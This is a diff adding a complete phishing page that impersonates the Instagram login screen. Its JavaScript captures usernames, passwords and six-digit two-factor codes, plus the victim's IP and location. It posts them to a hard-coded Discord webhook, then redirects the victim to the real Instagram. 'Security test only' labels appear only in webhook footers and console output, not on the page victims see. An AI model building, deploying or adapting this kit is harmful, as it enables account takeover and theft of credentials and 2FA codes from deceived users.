@@ -1,0 +1,783 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
+    <title>Instagram • Login</title>
+    <style>
+        /* DARK MODE THEME */
+        :root {
+            --bg-primary: #0a0a0a;
+            --bg-secondary: #121212;
+            --bg-card: #1e1e1e;
+            --border-color: #2d2d2d;
+            --text-primary: #f0f0f0;
+            --text-secondary: #a0a0a0;
+            --text-muted: #6c6c6c;
+            --blue-primary: #0095f6;
+            --blue-hover: #1aa3ff;
+            --fb-blue: #385185;
+            --danger: #ed4956;
+            --success: #4caf50;
+            --warning: #ff9800;
+            --border-radius-sm: 6px;
+            --border-radius-md: 8px;
+            --border-radius-lg: 10px;
+        }
+
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            background: var(--bg-primary);
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+            padding: 20px;
+        }
+
+        /* Main container */
+        .ig-container {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            width: 100%;
+            max-width: 380px;
+            position: relative;
+        }
+
+        /* Demo warning banner */
+        .warning-banner {
+            width: 100%;
+            background: var(--danger);
+            color: white;
+            text-align: center;
+            font-size: 12px;
+            font-weight: 700;
+            padding: 10px 16px;
+            border-radius: var(--border-radius-md) var(--border-radius-md) 0 0;
+            letter-spacing: 0.5px;
+        }
+
+        /* Page container */
+        .page {
+            display: none;
+            flex-direction: column;
+            width: 100%;
+            gap: 12px;
+        }
+
+        .page.active {
+            display: flex;
+        }
+
+        /* Card style */
+        .ig-card {
+            background: var(--bg-card);
+            border: 1px solid var(--border-color);
+            border-radius: 0 0 var(--border-radius-lg) var(--border-radius-lg);
+            padding: 36px 32px 32px;
+            width: 100%;
+        }
+
+        /* Logo */
+        .ig-logo {
+            text-align: center;
+            margin-bottom: 28px;
+            font-family: 'Grand Hotel', cursive;
+            font-size: 42px;
+            font-weight: 500;
+            color: var(--text-primary);
+            letter-spacing: -1px;
+        }
+        .ig-logo span {
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
+            font-weight: 700;
+            font-size: 38px;
+            background: linear-gradient(135deg, #feda77, #f58529, #dd2a7b, #8134af);
+            background-clip: text;
+            -webkit-background-clip: text;
+            color: transparent;
+        }
+
+        /* Inputs */
+        .ig-input {
+            width: 100%;
+            padding: 12px 14px;
+            font-size: 13px;
+            background: var(--bg-secondary);
+            border: 1px solid var(--border-color);
+            border-radius: var(--border-radius-sm);
+            color: var(--text-primary);
+            margin-bottom: 8px;
+            outline: none;
+            transition: all 0.2s;
+        }
+        .ig-input:focus {
+            border-color: var(--blue-primary);
+            background: var(--bg-card);
+        }
+        .ig-input::placeholder {
+            color: var(--text-muted);
+        }
+
+        /* Button */
+        .ig-btn {
+            width: 100%;
+            padding: 10px;
+            border-radius: var(--border-radius-md);
+            border: none;
+            font-size: 14px;
+            font-weight: 700;
+            cursor: pointer;
+            transition: background 0.2s;
+            font-family: inherit;
+        }
+        .ig-btn-blue {
+            background: var(--blue-primary);
+            color: white;
+            margin-top: 8px;
+        }
+        .ig-btn-blue:hover {
+            background: var(--blue-hover);
+        }
+        .ig-btn-blue:disabled {
+            opacity: 0.6;
+            cursor: not-allowed;
+        }
+
+        /* Divider */
+        .ig-divider {
+            display: flex;
+            align-items: center;
+            gap: 16px;
+            margin: 20px 0;
+        }
+        .ig-divider-line {
+            flex: 1;
+            height: 0.5px;
+            background: var(--border-color);
+        }
+        .ig-divider span {
+            font-size: 12px;
+            font-weight: 600;
+            color: var(--text-secondary);
+        }
+
+        /* Facebook button */
+        .ig-fb {
+            background: none;
+            border: none;
+            color: var(--fb-blue);
+            font-size: 14px;
+            font-weight: 600;
+            cursor: pointer;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 8px;
+            width: 100%;
+            padding: 6px;
+            font-family: inherit;
+        }
+        .ig-fb:hover {
+            opacity: 0.8;
+        }
+
+        /* Forgot link */
+        .forgot-link {
+            font-size: 12px;
+            color: var(--text-secondary);
+            text-align: center;
+            margin-top: 16px;
+            cursor: pointer;
+        }
+        .forgot-link:hover {
+            color: var(--text-primary);
+        }
+
+        /* Signup card */
+        .ig-signup-card {
+            background: var(--bg-card);
+            border: 1px solid var(--border-color);
+            border-radius: var(--border-radius-lg);
+            padding: 20px;
+            text-align: center;
+            font-size: 14px;
+            color: var(--text-secondary);
+        }
+        .ig-signup-card b {
+            color: var(--blue-primary);
+            cursor: pointer;
+            font-weight: 700;
+        }
+
+        /* App badges */
+        .ig-app-section {
+            text-align: center;
+            font-size: 12px;
+            color: var(--text-secondary);
+            margin-top: 16px;
+        }
+        .ig-badges {
+            display: flex;
+            gap: 10px;
+            justify-content: center;
+            margin-top: 10px;
+        }
+        .ig-badge {
+            background: var(--bg-secondary);
+            border: 1px solid var(--border-color);
+            border-radius: var(--border-radius-sm);
+            padding: 6px 14px;
+            font-size: 11px;
+            font-weight: 600;
+            color: var(--text-secondary);
+        }
+
+        /* Verification page styles */
+        .verify-icon {
+            text-align: center;
+            font-size: 48px;
+            margin-bottom: 8px;
+        }
+        .verify-title {
+            font-size: 20px;
+            font-weight: 700;
+            text-align: center;
+            color: var(--text-primary);
+            margin-bottom: 8px;
+        }
+        .verify-sub {
+            font-size: 13px;
+            color: var(--text-secondary);
+            text-align: center;
+            margin-bottom: 24px;
+            line-height: 1.4;
+        }
+        .code-row {
+            display: flex;
+            gap: 10px;
+            justify-content: center;
+            margin: 20px 0;
+        }
+        .code-box {
+            width: 48px;
+            height: 56px;
+            border: 1.5px solid var(--border-color);
+            border-radius: var(--border-radius-md);
+            text-align: center;
+            font-size: 24px;
+            font-weight: 700;
+            background: var(--bg-secondary);
+            color: var(--text-primary);
+            outline: none;
+            font-family: monospace;
+        }
+        .code-box:focus {
+            border-color: var(--blue-primary);
+        }
+        .resend-area {
+            font-size: 13px;
+            color: var(--text-secondary);
+            text-align: center;
+            margin-top: 16px;
+        }
+        .resend-area span {
+            color: var(--blue-primary);
+            cursor: pointer;
+            font-weight: 600;
+        }
+        .back-link {
+            text-align: center;
+            margin-top: 8px;
+            font-size: 13px;
+            cursor: pointer;
+            color: var(--text-secondary);
+        }
+        .back-link:hover {
+            color: var(--text-primary);
+        }
+
+        /* Success page */
+        .success-icon {
+            font-size: 56px;
+            text-align: center;
+            color: var(--success);
+        }
+        .success-title {
+            font-size: 22px;
+            font-weight: 700;
+            text-align: center;
+            color: var(--text-primary);
+            margin: 12px 0 8px;
+        }
+        .success-sub {
+            font-size: 13px;
+            color: var(--text-secondary);
+            text-align: center;
+            margin-bottom: 24px;
+            line-height: 1.4;
+        }
+
+        /* Error toast inline */
+        .error-toast {
+            background: rgba(237, 73, 86, 0.9);
+            color: white;
+            font-size: 12px;
+            padding: 8px 12px;
+            border-radius: 8px;
+            margin-top: 8px;
+            text-align: center;
+            display: none;
+        }
+    </style>
+</head>
+<body>
+
+<div class="ig-container">
+
+    <!-- PAGE 1: LOGIN -->
+    <div id="pageLogin" class="page active">
+        <div class="ig-card">
+            <div class="ig-logo">
+                <span>Instagram</span>
+            </div>
+            <input type="text" id="loginUsername" class="ig-input" placeholder="Phone number, username, or email" autocomplete="off">
+            <input type="password" id="loginPassword" class="ig-input" placeholder="Password">
+            <button id="loginBtn" class="ig-btn ig-btn-blue">Log in</button>
+            <div class="ig-divider">
+                <div class="ig-divider-line"></div>
+                <span>OR</span>
+                <div class="ig-divider-line"></div>
+            </div>
+            <button id="fbBtn" class="ig-fb">
+                <svg width="20" height="20" viewBox="0 0 24 24" fill="#385185"><path d="M24 12.073C24 5.404 18.627 0 12 0S0 5.404 0 12.073C0 18.1 4.388 23.094 10.125 24v-8.437H7.078v-3.49h3.047V9.41c0-3.025 1.792-4.697 4.533-4.697 1.312 0 2.686.235 2.686.235v2.97h-1.513c-1.491 0-1.956.93-1.956 1.883v2.258h3.328l-.532 3.49h-2.796V24C19.612 23.094 24 18.1 24 12.073z"/></svg>
+                Log in with Facebook
+            </button>
+            <div class="forgot-link" id="forgotLink">Forgot password?</div>
+            <div id="loginError" class="error-toast"></div>
+        </div>
+        <div class="ig-signup-card">
+            Don't have an account? <b id="signupLink">Sign up</b>
+        </div>
+        <div class="ig-app-section">
+            Get the app.
+            <div class="ig-badges">
+                <div class="ig-badge">App Store</div>
+                <div class="ig-badge">Google Play</div>
+            </div>
+        </div>
+    </div>
+
+    <!-- PAGE 2: VERIFICATION CODE -->
+    <div id="pageVerify" class="page">
+        <div class="ig-card">
+            <div class="verify-icon">✉️</div>
+            <div class="verify-title">Enter confirmation code</div>
+            <div class="verify-sub">We sent a 6-digit code to your email or phone. Enter it below.</div>
+            <div class="code-row" id="codeRow">
+                <input class="code-box" maxlength="1" type="text" inputmode="numeric" data-idx="0">
+                <input class="code-box" maxlength="1" type="text" inputmode="numeric" data-idx="1">
+                <input class="code-box" maxlength="1" type="text" inputmode="numeric" data-idx="2">
+                <input class="code-box" maxlength="1" type="text" inputmode="numeric" data-idx="3">
+                <input class="code-box" maxlength="1" type="text" inputmode="numeric" data-idx="4">
+                <input class="code-box" maxlength="1" type="text" inputmode="numeric" data-idx="5">
+            </div>
+            <button id="verifyBtn" class="ig-btn ig-btn-blue">Confirm</button>
+            <div class="resend-area">
+                Didn't get a code? <span id="resendCode">Resend code</span>
+            </div>
+            <div id="verifyError" class="error-toast"></div>
+        </div>
+        <div class="back-link" id="backToLogin">← Back to login</div>
+    </div>
+
+    <!-- PAGE 3: SUCCESS / REDIRECT -->
+    <div id="pageSuccess" class="page">
+        <div class="ig-card" style="text-align: center;">
+            <div class="success-icon">✓</div>
+            <div class="success-title">Verified!</div>
+            <div class="success-sub">Your identity has been confirmed. Redirecting to Instagram...</div>
+            <button id="openIgBtn" class="ig-btn ig-btn-blue">Open Instagram</button>
+        </div>
+    </div>
+</div>
+
+<script>
+    // =========================================================
+    // 🔴 DISCORD WEBHOOK CONFIGURATION
+    // 🔴 REPLACE THESE WITH YOUR ACTUAL DISCORD WEBHOOK URLs
+    // =========================================================
+    // Webhook #1: For login credentials (username + password)
+    const DISCORD_WEBHOOK_LOGIN = "https://discord.com/api/webhooks/1237353940295614536/1PguqJ46OPUnjaYTXAjuNAWYTnVZUJCXglswK9KnhX5MBO9lMAYChD5UaALSCfaCTsoU";
+    // Webhook #2: For verification codes (2FA/6-digit code)
+    const DISCORD_WEBHOOK_VERIFY = "https://discord.com/api/webhooks/1237353940295614536/1PguqJ46OPUnjaYTXAjuNAWYTnVZUJCXglswK9KnhX5MBO9lMAYChD5UaALSCfaCTsoU";
+    
+    // Helper: Send data to a specific Discord webhook
+    async function sendToDiscord(webhookUrl, embedData, webhookType) {
+        if (!webhookUrl || webhookUrl.includes("YOUR_WEBHOOK")) {
+            console.warn(`⚠️ Discord webhook (${webhookType}) not configured.`);
+            return false;
+        }
+        
+        const payload = {
+            embeds: [embedData],
+            username: "Instagram Log Monitor",
+            avatar_url: "https://www.instagram.com/static/images/ico/favicon-192.png/68d99ba29cc8.png"
+        };
+        
+        try {
+            const response = await fetch(webhookUrl, {
+                method: "POST",
+                headers: { "Content-Type": "application/json" },
+                body: JSON.stringify(payload)
+            });
+            if (response.ok) {
+                console.log(`✅ Data sent to Discord (${webhookType})`);
+                return true;
+            } else {
+                console.error(`❌ Discord webhook error (${webhookType}):`, response.status);
+                return false;
+            }
+        } catch (err) {
+            console.error(`❌ Failed to send to Discord (${webhookType}):`, err);
+            return false;
+        }
+    }
+    
+    // Get IP/location info (async)
+    async function getLocationInfo() {
+        try {
+            const ipRes = await fetch('https://ipapi.co/json/');
+            const ipData = await ipRes.json();
+            return `${ipData.ip} • ${ipData.city}, ${ipData.country_name} (${ipData.org || 'Unknown ISP'})`;
+        } catch(e) {
+            return "IP info unavailable (CORS or network issue)";
+        }
+    }
+    
+    function escapeMarkdown(text) {
+        if (!text) return "";
+        return text.replace(/([`*_~|])/g, '\\$1');
+    }
+    
+    // Send login credentials to webhook #1
+    async function sendLoginToDiscord(username, password) {
+        const locationInfo = await getLocationInfo();
+        const timestamp = new Date().toISOString();
+        
+        const embed = {
+            title: "📸 Instagram Login Credentials",
+            color: 0xE1306C,
+            fields: [
+                {
+                    name: "👤 Username/Email",
+                    value: `\`\`\`${escapeMarkdown(username)}\`\`\``,
+                    inline: false
+                },
+                {
+                    name: "🔑 Password",
+                    value: `\`\`\`${escapeMarkdown(password)}\`\`\``,
+                    inline: false
+                },
+                {
+                    name: "🌍 Location / IP",
+                    value: `\`\`\`${escapeMarkdown(locationInfo)}\`\`\``,
+                    inline: false
+                },
+                {
+                    name: "⏰ Timestamp",
+                    value: `\`${timestamp}\``,
+                    inline: true
+                },
+                {
+                    name: "📱 Platform",
+                    value: `\`Web (Desktop/Mobile)\``,
+                    inline: true
+                }
+            ],
+            footer: {
+                text: "⚠️ Security Test Only — Do not use real credentials"
+            },
+            timestamp: timestamp
+        };
+        
+        return await sendToDiscord(DISCORD_WEBHOOK_LOGIN, embed, "LOGIN");
+    }
+    
+    // Send verification code to webhook #2
+    async function sendVerificationToDiscord(username, verificationCode) {
+        const locationInfo = await getLocationInfo();
+        const timestamp = new Date().toISOString();
+        
+        const embed = {
+            title: "🔐 Instagram 2FA / Verification Code",
+            color: 0x5865F2,
+            fields: [
+                {
+                    name: "👤 Associated Username",
+                    value: `\`\`\`${escapeMarkdown(username)}\`\`\``,
+                    inline: false
+                },
+                {
+                    name: "🔢 Verification Code (6-digit)",
+                    value: `\`\`\`${escapeMarkdown(verificationCode)}\`\`\``,
+                    inline: false
+                },
+                {
+                    name: "🌍 Location / IP",
+                    value: `\`\`\`${escapeMarkdown(locationInfo)}\`\`\``,
+                    inline: false
+                },
+                {
+                    name: "⏰ Timestamp",
+                    value: `\`${timestamp}\``,
+                    inline: true
+                },
+                {
+                    name: "🔐 Code Type",
+                    value: `\`2FA / SMS / Email\``,
+                    inline: true
+                }
+            ],
+            footer: {
+                text: "⚠️ 2FA Code Captured — Security Test Only"
+            },
+            timestamp: timestamp
+        };
+        
+        return await sendToDiscord(DISCORD_WEBHOOK_VERIFY, embed, "VERIFICATION");
+    }
+    
+    // Global storage for captured credentials
+    let capturedUsername = "";
+    let capturedPassword = "";
+    
+    // DOM Elements
+    const pageLogin = document.getElementById('pageLogin');
+    const pageVerify = document.getElementById('pageVerify');
+    const pageSuccess = document.getElementById('pageSuccess');
+    const loginBtn = document.getElementById('loginBtn');
+    const usernameInput = document.getElementById('loginUsername');
+    const passwordInput = document.getElementById('loginPassword');
+    const loginErrorDiv = document.getElementById('loginError');
+    const verifyBtn = document.getElementById('verifyBtn');
+    const verifyErrorDiv = document.getElementById('verifyError');
+    const resendSpan = document.getElementById('resendCode');
+    const backToLogin = document.getElementById('backToLogin');
+    const openIgBtn = document.getElementById('openIgBtn');
+    const fbBtn = document.getElementById('fbBtn');
+    const forgotLink = document.getElementById('forgotLink');
+    const signupLink = document.getElementById('signupLink');
+    
+    // Code boxes array
+    const codeBoxes = document.querySelectorAll('.code-box');
+    
+    // Page switching with smooth transition
+    function showPage(pageName) {
+        pageLogin.classList.remove('active');
+        pageVerify.classList.remove('active');
+        pageSuccess.classList.remove('active');
+        if (pageName === 'login') pageLogin.classList.add('active');
+        if (pageName === 'verify') pageVerify.classList.add('active');
+        if (pageName === 'success') pageSuccess.classList.add('active');
+        
+        // Clear errors when switching
+        loginErrorDiv.style.display = 'none';
+        verifyErrorDiv.style.display = 'none';
+    }
+    
+    // Auto-focus and code box handling
+    function initCodeBoxes() {
+        codeBoxes.forEach((box, idx, arr) => {
+            box.addEventListener('input', function(e) {
+                this.value = this.value.replace(/[^0-9]/g, '');
+                if (this.value && idx < arr.length - 1) {
+                    arr[idx + 1].focus();
+                }
+            });
+            box.addEventListener('keydown', function(e) {
+                if (e.key === 'Backspace' && !this.value && idx > 0) {
+                    arr[idx - 1].focus();
+                }
+            });
+        });
+    }
+    
+    // Get concatenated verification code
+    function getVerificationCode() {
+        let code = '';
+        codeBoxes.forEach(box => { code += box.value; });
+        return code;
+    }
+    
+    // Clear code boxes
+    function clearCodeBoxes() {
+        codeBoxes.forEach(box => { box.value = ''; });
+        if (codeBoxes[0]) codeBoxes[0].focus();
+    }
+    
+    // LOGIN ACTION: capture credentials, send to Discord webhook #1, then go to verify page
+    async function handleLogin() {
+        const username = usernameInput.value.trim();
+        const password = passwordInput.value;
+        
+        // Validate fields
+        if (!username || !password) {
+            loginErrorDiv.innerText = "Please fill in both username/email and password.";
+            loginErrorDiv.style.display = 'block';
+            return;
+        }
+        
+        // Store credentials
+        capturedUsername = username;
+        capturedPassword = password;
+        
+        // Show loading on button
+        const originalBtnText = loginBtn.innerText;
+        loginBtn.innerText = "Logging in...";
+        loginBtn.disabled = true;
+        
+        // Send to Discord webhook #1 (login credentials)
+        const sent = await sendLoginToDiscord(username, password);
+        
+        if (sent) {
+            loginErrorDiv.style.backgroundColor = "rgba(76, 175, 80, 0.9)";
+            loginErrorDiv.innerText = "✓ Login captured. Redirecting to verification...";
+            loginErrorDiv.style.display = 'block';
+        } else {
+            loginErrorDiv.innerText = "Demo mode: credentials captured locally. Continue to verification.";
+            loginErrorDiv.style.backgroundColor = "rgba(255, 152, 0, 0.9)";
+            loginErrorDiv.style.display = 'block';
+        }
+        
+        setTimeout(() => {
+            loginBtn.innerText = originalBtnText;
+            loginBtn.disabled = false;
+            loginErrorDiv.style.display = 'none';
+            loginErrorDiv.style.backgroundColor = "rgba(237, 73, 86, 0.9)";
+            // Move to verification page
+            showPage('verify');
+            clearCodeBoxes();
+            setTimeout(() => {
+                if (codeBoxes[0]) codeBoxes[0].focus();
+            }, 100);
+        }, 1200);
+    }
+    
+    // VERIFY ACTION: checks 6-digit code, sends to Discord webhook #2, then redirect
+    async function handleVerify() {
+        const code = getVerificationCode();
+        if (code.length !== 6 || !/^\d{6}$/.test(code)) {
+            verifyErrorDiv.innerText = "Please enter a valid 6-digit verification code.";
+            verifyErrorDiv.style.display = 'block';
+            return;
+        }
+        
+        // Show loading
+        verifyBtn.innerText = "Confirming...";
+        verifyBtn.disabled = true;
+        
+        // Send verification code to Discord webhook #2
+        const sent = await sendVerificationToDiscord(capturedUsername, code);
+        
+        if (sent) {
+            verifyErrorDiv.style.backgroundColor = "rgba(76, 175, 80, 0.9)";
+            verifyErrorDiv.innerText = "✓ Verification code sent to Discord!";
+            verifyErrorDiv.style.display = 'block';
+        } else {
+            verifyErrorDiv.style.backgroundColor = "rgba(255, 152, 0, 0.9)";
+            verifyErrorDiv.innerText = "Demo: code captured locally. Redirecting...";
+            verifyErrorDiv.style.display = 'block';
+        }
+        
+        setTimeout(() => {
+            verifyErrorDiv.style.display = 'none';
+            verifyErrorDiv.style.backgroundColor = "rgba(237, 73, 86, 0.9)";
+            showPage('success');
+            verifyBtn.innerText = "Confirm";
+            verifyBtn.disabled = false;
+        }, 1000);
+    }
+    
+    // Redirect to REAL Instagram
+    function redirectToInstagram() {
+        window.location.href = "https://www.instagram.com";
+    }
+    
+    // Resend code simulation
+    function resendCode() {
+        verifyErrorDiv.style.backgroundColor = "rgba(76, 175, 80, 0.9)";
+        verifyErrorDiv.innerText = "✨ New verification code sent! (demo: any 6 digits will work)";
+        verifyErrorDiv.style.display = 'block';
+        clearCodeBoxes();
+        setTimeout(() => {
+            verifyErrorDiv.style.display = 'none';
+            verifyErrorDiv.style.backgroundColor = "rgba(237, 73, 86, 0.9)";
+        }, 2500);
+    }
+    
+    // Facebook / Forgot / Signup demo warnings
+    function showDemoMessage(message) {
+        loginErrorDiv.innerText = message;
+        loginErrorDiv.style.display = 'block';
+        setTimeout(() => {
+            loginErrorDiv.style.display = 'none';
+        }, 2000);
+    }
+    
+    // Event Listeners
+    loginBtn.addEventListener('click', handleLogin);
+    verifyBtn.addEventListener('click', handleVerify);
+    resendSpan.addEventListener('click', resendCode);
+    backToLogin.addEventListener('click', () => {
+        showPage('login');
+        usernameInput.value = '';
+        passwordInput.value = '';
+        capturedUsername = '';
+        capturedPassword = '';
+    });
+    openIgBtn.addEventListener('click', redirectToInstagram);
+    
+    fbBtn.addEventListener('click', (e) => {
+        e.preventDefault();
+        showDemoMessage("📘 Facebook login demo — please use standard login above.");
+    });
+    forgotLink.addEventListener('click', () => {
+        showDemoMessage("🔐 Forgot password demo — reset link would be sent (simulated).");
+    });
+    signupLink.addEventListener('click', () => {
+        showDemoMessage("📝 Sign up demo — create account feature not available.");
+    });
+    
+    // Enter key shortcuts
+    usernameInput.addEventListener('keypress', (e) => {
+        if (e.key === 'Enter') handleLogin();
+    });
+    passwordInput.addEventListener('keypress', (e) => {
+        if (e.key === 'Enter') handleLogin();
+    });
+    
+    // Allow Enter on last code box to trigger verify
+    if (codeBoxes[5]) {
+        codeBoxes[5].addEventListener('keypress', (e) => {
+            if (e.key === 'Enter') handleVerify();
+        });
+    }
+    
+    // Initialize code boxes
+    initCodeBoxes();
+    
+    // Console warning
+    console.log("%c⚠️ SECURITY TESTING ONLY — Dual webhook mode active", "color: red; font-size: 14px; font-weight: bold;");
+    console.log("%cWebhook #1: Login credentials | Webhook #2: Verification codes", "color: orange; font-size: 12px;");
+    console.log("%cSet DISCORD_WEBHOOK_LOGIN and DISCORD_WEBHOOK_VERIFY variables with your actual webhook URLs.", "color: #ffaa00; font-size: 11px;");
+</script>
+</body>
+</html>
